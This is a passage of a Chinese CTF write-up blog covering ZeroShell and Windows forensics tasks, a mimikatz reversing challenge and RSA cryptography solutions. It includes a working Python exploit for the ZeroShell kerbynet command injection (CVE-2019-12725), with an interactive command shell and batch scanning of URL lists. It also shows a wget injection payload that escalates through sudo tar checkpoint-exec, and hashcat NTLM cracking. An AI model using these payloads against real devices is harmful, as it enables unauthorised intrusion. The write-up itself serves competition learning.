class="built_in">print</span>(<span class="string">&quot;\033[32m[+]%s is vuln\033[0m&quot;</span> %url2)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is not vuln\033[0m&quot;</span> %url1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout\033[0m&quot;</span> %url2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cmdshell</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmdshell</span>(<span class="params">url</span>):</span><br><span class="line"><span class="keyword">if</span> check_vuln(url)==<span class="number">1</span>:</span><br><span class="line">url = parse.urlparse(url)</span><br><span class="line">url1 = url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc + <span class="string">&#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">shell = <span class="built_in">input</span>(<span class="string">&quot;\033[35mcmd: \033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> shell ==<span class="string">&quot;exit&quot;</span>:</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = requests.get(url1 + shell + <span class="string">&#x27;%0A%27&#x27;</span>,headers=headers,timeout=<span class="number">10</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> res.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(res.text) != <span class="number">0</span>:</span><br><span class="line">vulntext=res.text.split(<span class="string">&#x27;&lt;html&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[32m%s\033[0m&quot;</span> %vulntext[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s Command execution failed !\033[0m&quot;</span> %url1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[31m[-]%s is timeout!\033[0m&quot;</span> %url1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">url_list, pools=<span class="number">5</span></span>):</span><br><span class="line">works = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line"><span class="comment"># works.append((func_params, None))</span></span><br><span class="line">works.append(i)</span><br><span class="line"><span class="comment"># print(works)</span></span><br><span class="line">pool = threadpool.ThreadPool(pools)</span><br><span class="line">reqs = threadpool.makeRequests(check_vuln, works)</span><br><span class="line">[pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">show = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _____ _   _ _____       _____  _____  __   _____        __   _____  ___________  _____ </span></span><br><span class="line"><span class="string">/  __ \ | | |  ___|     / __  \|  _  |/  | |  _  |      /  | / __  \|___  / __  \|  ___|</span></span><br><span class="line"><span class="string">| /  \/ | | | |__ ______`&#x27; / /&#x27;| |/&#x27; |`| | | |_| |______`| | `&#x27; / /&#x27;   / /`&#x27; / /&#x27;|___ \ </span></span><br><span class="line"><span class="string">| |   | | | |  __|______| / /  |  /| | | | \____ |______|| |   / /    / /   / /      \ \</span></span><br><span class="line"><span class="string">| \__/\ \_/ / |___      ./ /___\ |_/ /_| |_.___/ /      _| |_./ /___./ /  ./ /___/\__/ /</span></span><br><span class="line"><span class="string"> \____/\___/\____/      \_____/ \___/ \___/\____/       \___/\_____/\_/   \_____/\____/ </span></span><br><span class="line"><span class="string">                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                      </span></span><br><span class="line"><span class="string">                                                   CVE-2019-12725 By m2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(show + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">arg=ArgumentParser(description=<span class="string">&#x27;CVE-2019-12725 By m2&#x27;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-u&quot;</span>,</span><br><span class="line"><span class="string">&quot;--url&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-f&quot;</span>,</span><br><span class="line"><span class="string">&quot;--file&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:url.txt&quot;</span>)</span><br><span class="line">arg.add_argument(<span class="string">&quot;-c&quot;</span>,</span><br><span class="line"><span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">args=arg.parse_args()</span><br><span class="line">url=args.url</span><br><span class="line">filename=args.file</span><br><span class="line">cmd=args.cmd</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]任务开始...&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> url != <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">check_vuln(url)</span><br><span class="line"><span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd == <span class="literal">None</span> <span class="keyword">and</span> filename != <span class="literal">None</span>:</span><br><span class="line">start=time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(filename):</span><br><span class="line">i=i.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">check_vuln(i)</span><br><span class="line">end=time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;任务完成，用时%d&#x27;</span> %(end-start))</span><br><span class="line"><span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> cmd != <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">cmdshell(cmd)</span><br></pre></td></tr></table></figure><p>然后运行，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085303408-1275301654.png" alt="image-20241216085252236"></p><p>然后去找flag，在<code>/Database/flag</code>下面。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085308199-886976928.png" alt="image-20241216085257643"></p><p><code>flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;</code></p><h2 id="zeroshell-3">zeroshell_3</h2><p>查看主机的外联服务器的所有TCP，UDP，IP和进程使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antp</span><br></pre></td></tr></table></figure><p>（但是有点抽象，有时候看不到那个IP，）其他都是127.0.0.1只有他一个。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085406663-304992750.png" alt="image-20241216085355787"></p><p><code>flag&#123;202.115.89.103&#125;</code></p><h2 id="zeroshell-4">zeroshell_4</h2><p>直接找可执行文件像.sh或者.nginx这种使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;.sh&quot;</span></span><br><span class="line">find / -name <span class="string">&quot;.nginx&quot;</span></span><br></pre></td></tr></table></figure><p>.sh文件没有，发现.nginx很多，尝试一下。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085759698-1634771253.png" alt="image-20241216085749134"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085915696-1839610967.png" alt="image-20241216085905063"></p><p><code>flag&#123;.nginx&#125;</code></p><h2 id="zeroshell-5">zeroshell_5</h2><p>本身是一个RCE的洞，可以直接远程下载，用wget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">&quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=&#x27;cat%20/tmp/.nginx&#x27;%0A&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接把1.nginx dump下来，拉到ida，然后shift+f12直接找密钥了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216085949719-1509725601.png" alt="image-20241216085938811"></p><p><code>flag&#123;11223344qweasdzxc&#125;</code></p><h2 id="zeroshell-6">zeroshell_6</h2><p>题目说找到木马的启动项，直接ps -aux查看进程发现很多apache自带的进程，可疑的就几个，注意看这个进程</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090015789-1349072241.png" alt="image-20241216090004900"></p><p>一级一级网上找然后在system目录下面发现一个startup</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090031219-684402653.png" alt="image-20241216090020550"></p><p>往startup下面一个个找也不多，然后找到最终地方</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090039122-1056220359.png" alt="image-20241216090028452"></p><p><code>flag&#123;/var/register/system/startup/scripts/nat/File&#125;</code></p><h2 id="WinFT-1">WinFT_1</h2><p>题目说找受控机木马的回连域名及ip及端口，</p><p>直接看机器里面的第一个文件exe</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090519510-272396622.png" alt="image-20241216090508053"></p><p>看见最后一个进程里面就有，得到flag</p><p><code>flag&#123;miscsecure.com:192.168.116.130:443&#125;</code></p><h2 id="WinFT-2">WinFT_2</h2><p>说是启动项里面的flag一开始还是去msconfig里面找的，结果不知道，一想肯定不是exe，然后去计划任务看，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090546842-57224494.png" alt="image-20241216090536136"></p><p>然后放Cyberchef里面解出来。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090553292-1213496669.png" alt="image-20241216090542540"></p><p>解出flag</p><p><code>flag&#123;AES_encryption_algorithm_is_an_excellent_encryption_algorithm&#125;</code></p><h2 id="WinFT-5">WinFT_5</h2><p>直接把流量放kali里面，binwalk分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090709285-1559417030.png" alt="image-20241216090658443"></p><p>发现位于22258409的偏移位置存在flag.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090714616-1417817657.png" alt="image-20241216090703882"></p><p>使用dd命令分离，提取出来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090720160-2147403155.png" alt="image-20241216090709460"></p><p>发现需要密码，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090729621-221989880.png" alt="image-20241216090718742"></p><p>然后把zip放0101里面，发现有东西，</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090734963-1252085038.png" alt="image-20241216090724351"></p><p>放到Cyberchef里面解出密码：时间线关联非常重要</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090746208-2119841521.png" alt="image-20241216090735485"></p><p>解出flag</p><p><code>flag&#123;a1b2c3d4e5f67890abcdef1234567890-2f4d90a1b7c8e2349d3f56e0a9b01b8a-CBC&#125;</code></p><h2 id="sc05-1">sc05_1</h2><p>这个题直接打开execl，转到tcp-export的位置，直接找到时间</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090813314-536377005.png" alt="image-20241216090802255"></p><p>2024/11/09_16:22:42这是时间，MD5编码一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216090839866-1852212176.png" alt="image-20241216090829208"></p><p>得到<code>flag&#123;01DF5BC2388E287D4CC8F11EA4D31929&#125;</code></p><h2 id="Kiwi">Kiwi</h2><p>exe直接拉ida之后，发现是个<code>mimikatz</code>程序，<code>lsadump::lsa /patch</code> 是这个程序的命令参数，作用是导出lsa，目的就是找这个东西，所以本题的逻辑就是去逆这个玩意儿</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091125302-903395086.png" alt="image-20241216091114310"></p><p>主要看下面的几个函数，先看函数sub_140082974，先是对input有一步异或，异或的逻辑是初始化了一个变量v6，而v6的值可以通过变量unk_140111152中有一个获取，然后循环v5的次数，得到v6的值，就是一个伪随机数，然后得到的数再在下面做一个变表的base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091133647-585107726.png" alt="image-20241216091122644"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091140755-348375415.png" alt="image-20241216091129821"></p><p>最后main里面的函数sub_140082774感觉就是一个将加密之后的结果上传的功能，然后给了流量包，那么去流量包里找密文即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091150949-544335224.png" alt="image-20241216091140032"></p><p>然后去看流量包，筛选一下http流量的upload流</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091158279-451596707.png" alt="image-20241216091147708"></p><p>然后发现三个包里的密文都是一样的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091206352-768869769.png" alt="image-20241216091155375"></p><p>那么直接逆即可，懒得模拟随机数v6计算的过程，直接动调随机数种子就好了，然后直接解变表之后的数据即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091227952-1415334478.png" alt="image-20241216091216995"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> temp[<span class="number">178</span>]=&#123;<span class="number">0xb9</span>,<span class="number">0x48</span>,<span class="number">0x1c</span>,<span class="number">0x58</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0x51</span>,<span class="number">0x7d</span>,<span class="number">0x27</span>,<span class="number">0x70</span>,<span class="number">0x33</span>,<span class="number">0x6f</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0x82</span>,<span class="number">0x21</span>,<span class="number">0x08</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0x49</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x28</span>,<span class="number">0x9b</span>,<span class="number">0x7d</span>,<span class="number">0xbb</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x45</span>,<span class="number">0x7a</span>,<span class="number">0x96</span>,<span class="number">0x38</span>,<span class="number">0x3e</span>,<span class="number">0x7d</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x86</span>,<span class="number">0x60</span>,<span class="number">0x4f</span>,<span class="number">0x6c</span>,<span class="number">0x3b</span>,<span class="number">0x87</span>,<span class="number">0x2e</span>,<span class="number">0x26</span>,<span class="number">0x72</span>,<span class="number">0x51</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x79</span>,<span class="number">0xbd</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0x67</span>,<span class="number">0x71</span>,<span class="number">0x4a</span>,<span class="number">0xa2</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x3a</span>,<span class="number">0x8f</span>,<span class="number">0x68</span>,<span class="number">0xda</span>,<span class="number">0x7f</span>,<span class="number">0x74</span>,<span class="number">0x2a</span>,<span class="number">0x33</span>,<span class="number">0x55</span>,<span class="number">0x8d</span>,<span class="number">0x5e</span>,<span class="number">0x2b</span>,<span class="number">0x39</span>,<span class="number">0x6d</span>,<span class="number">0xbe</span>,<span class="number">0x5f</span>,<span class="number">0x74</span>,<span class="number">0x74</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>,<span class="number">0x8e</span>,<span class="number">0x4b</span>,<span class="number">0x4d</span>,<span class="number">0x99</span>,<span class="number">0x64</span>,<span class="number">0x79</span>,<span class="number">0x63</span>,<span class="number">0xb3</span>,<span class="number">0x73</span>,<span class="number">0xca</span>,<span class="number">0x31</span>,<span class="number">0x90</span>,<span class="number">0xc3</span>,<span class="number">0x77</span>,<span class="number">0x1b</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>,<span class="number">0x52</span>,<span class="number">0x11</span>,<span class="number">0xbc</span>,<span class="number">0xbd</span>,<span class="number">0x86</span>,<span class="number">0xb2</span>,<span class="number">0x78</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0x56</span>,<span class="number">0x8f</span>,<span class="number">0x6c</span>,<span class="number">0x94</span>,<span class="number">0xb4</span>,<span class="number">0x3a</span>,<span class="number">0x7f</span>,<span class="number">0x14</span>,<span class="number">0x4b</span>,<span class="number">0x79</span>,<span class="number">0xb6</span>,<span class="number">0x8c</span>,<span class="number">0xb0</span>,<span class="number">0xad</span>,<span class="number">0x8b</span>,<span class="number">0x67</span>,<span class="number">0x6d</span>,<span class="number">0xd1</span>,<span class="number">0x7a</span>,<span class="number">0x9a</span>,<span class="number">0xa7</span>,<span class="number">0x31</span>,<span class="number">0x74</span>,<span class="number">0x25</span>,<span class="number">0x3e</span>,<span class="number">0x61</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x3d</span>,<span class="number">0x63</span>,<span class="number">0x5e</span>,<span class="number">0x77</span>,<span class="number">0x6b</span>,<span class="number">0x7c</span>,<span class="number">0x3f</span>,<span class="number">0x24</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x9f</span>,<span class="number">0x53</span>,<span class="number">0x84</span>,<span class="number">0x92</span>,<span class="number">0x42</span>,<span class="number">0xa0</span>,<span class="number">0x7d</span>,<span class="number">0x66</span>,<span class="number">0x70</span>,<span class="number">0x3b</span>,<span class="number">0xd3</span>,<span class="number">0x65</span>,<span class="number">0xa2</span>,<span class="number">0x6d</span>,<span class="number">0x7f</span>,<span class="number">0x19</span>,<span class="number">0x92</span>,<span class="number">0x7a</span>,<span class="number">0x8c</span>,<span class="number">0xb8</span>,<span class="number">0x6b</span>,<span class="number">0x12</span>,<span class="number">0x18</span>,<span class="number">0x66</span>,<span class="number">0x74</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x64</span>,<span class="number">0x9d</span>,<span class="number">0x0e</span>,<span class="number">0x6f</span>,<span class="number">0x53</span>,<span class="number">0x96</span>,<span class="number">0x49</span>,<span class="number">0x61</span>,<span class="number">0x5d</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bbq;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x69</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">178</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            bbq=temp[i]-(<span class="built_in">rand</span>()%<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,bbq^<span class="number">0x69</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091236273-1371002148.png" alt="image-20241216091225651"></p><p>然后直接把Lihua的NTLM去撞一下hash</p><p>直接上工具，得到密码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">1000</span> -a <span class="number">0</span> --force <span class="number">23</span>d1e086b85cc18587bbc8c33adefe07 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091249996-1016038955.png" alt="image-20241216091239077"></p><p><code>flag&#123;memeallme!&#125;</code></p><h1>密码学</h1><h2 id="rasnd">rasnd</h2><p>基本上和DownUnderCTF apbq rsa i一致，密码系统的漏洞在于$x_1,x_2$的位数太小了，我们可以对hint1和hint2两边分别乘上$x_2,x_1$，然后两式相减构造出因子$q$，这样一来我们就可以和模数$n$求gcd得到我们的p，q了，完整的推导过程如下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091546611-1355733929.png" alt="image-20241216091535974"></p><p>第一段flag的脚本拿maple的改改就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">12041484248912643032281827138855623754144214035159379257661479163138740691775879744970066188895287834305299993544492956391792960896102848747030186725527727462894712060700333010084161232292945341786532686079371670477415860442278642697221340583569645588845014599550638325912186989334147835969874061056581067882184577796454285728001596032991576548616505694738258644347926711399658118922938510938119887205321934129700411659944514995029920532395752664247590123953777766329926456117538440392869407741390284440815213055049158646992117671363087867033230162348771385273345393144890080701361216495994574190386498448916311816797</span></span><br><span class="line">c1 = <span class="number">10606131316309955980934489999367845331927443863828583686141238316607269050684817039429298888781427841737522428868990033129396359422071583487650116153933235992772589074023014756603570826140692683719646462908402695451323182710065741160367461533107537946979392683247488668328727583897596393913788430745564403219132250771930726681544778750383056036694256341891369906160656846870749190113082284100872538571850988590168260190474932411452384081833324921809119609733433067883975638920071176430344363427978212930714208437515478915112319607619770956843101985777866969917968203033417800410149877887005212278008964025655987940957</span></span><br><span class="line">hint1 = <span class="number">1210163329385529229728939135743311954497267498380547164909234906003973611593798031761260290741249172090725684217414693693114449324670072882779106749063248097663867799443199777334875204112817022790357889479347171489446008099356250837065466918892616549927163255749494695158589358908509028746798132552909553239850862487264153570503905570515124883</span></span><br><span class="line">hint2 = <span class="number">5051204836955493115902299043864227023948832461277034652488258835184221521626345855566463934505556519381805282442109159775267806057755363491698274342564684351612127794982915561668169373789547317570427657539052251405041553056803632890416687608340386053780952769614333767097202054166611376586274576239144083005297435121927157297060690207800186682896326015350219721047026234504118337172881814255423542199000966155216738725842757720428244680380446841837035234700310983</span></span><br><span class="line">apbq1 = hint1 + <span class="number">0x114</span></span><br><span class="line">apbq2 = hint2 + <span class="number">0x514</span></span><br><span class="line"></span><br><span class="line">h1, h2 = apbq1, apbq2</span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> product(trange(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q = gcd(a1*h1 - a2*h2, n1)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span> <span class="keyword">and</span> q&lt;n1:</span><br><span class="line">        <span class="built_in">print</span>(q,n1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">q = <span class="number">114411205592246972220921230297242077940657645574270285474331214662896407392806621491630870605100409685745977685037681045756459767749822052290189670280723035164949944851395458359172624983161919320250363279972807380631771541310372109230847026234642522745139142418827828880645203931389076624693764995135409308641</span></span><br><span class="line">p = n1 // q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c1, d, n1))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到第一段flag：flag{d50d53cd-e2ce-</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091602094-2096860699.png" alt="image-20241216091551494"></p><p>第二部分就是一个有限域下的逆元，对hint求逆元我们可以得到两个等式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091623283-945716044.png" alt="image-20241216091612697"></p><p>直接z3解方程，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">21626909171908453692251924387103943429444078378390804029791359086344901457614128315777353777946154715705188025455454883506581852192745448695330171712065848059085447176298338547611168540505303622649991647459241389851267706481741195973923366166350969428740106246575652922070364437283707248673414247015834408154336841845500174634585533145550612240655077795822499312831628265010867392272132327421316583927430144370227936025377802536431841460046560013098106494136549616711676888653891244666437683890387799042293066126208312839317392500611947692798756916972089791796065424069966139988959825520104626886407271566397598014479</span></span><br><span class="line">c2 = <span class="number">569516604779891642229626563202425917599205242605000009759024900334197676760498875709356073629224710968242118774272590035957794014944814569027666346273772760891740151661832004406395109811886627118507348575757378450205961170154177578337894121169344562117847542197369098179880407292635572736750972421301634710104680523760640958412310434786115630793487435865984193741176650867539434921286751815555011295375372628772142693142157388409831904845942568574027054385393890634270431602503271189772689768282466095937885481574735502991070696612305833770499878657295850059864341504403869711352220766605065553807072723398104147275</span></span><br><span class="line">hint = <span class="number">7354993101719521835942057560559580408743463323132751631614029356471066763586282676677888312943475827012461736138179904586928941942658362522899594590538632189792057377645275207357701819794899897630241261959366946307314047096789448491079019668061348270530520611478739108630519794038167843924690066067571126829134798676602734885527731532719971211866068475981470917729745697545742042055696088126726481101239997605997896836996320123720551222524217796125190116733813486368990126242621202368626320634775326774029367415577855148616903730121702683124218622095514962048699336270886055555358735126758449948884277874079744761833</span></span><br><span class="line"></span><br><span class="line">x = inverse(hint, n2)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver.add(<span class="number">514</span> * p - <span class="number">114</span> * q == x)</span><br><span class="line">solver.add(p * q == n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    p_val = model[p].as_long()</span><br><span class="line">    q_val = model[q].as_long()</span><br><span class="line"></span><br><span class="line">    d = inverse(<span class="number">0x10001</span>, (p_val - <span class="number">1</span>) * (q_val - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c2, d, n2)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到后一段flag：453b-b352-ab1385bd22af}</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091644221-341610445.png" alt="image-20241216091633317"></p><p>得到最终flag：</p><p><code>flag&#123;d50d53cd-e2ce-453b-b352-ab1385bd22af&#125;</code></p><h1>逆向工程</h1><h2 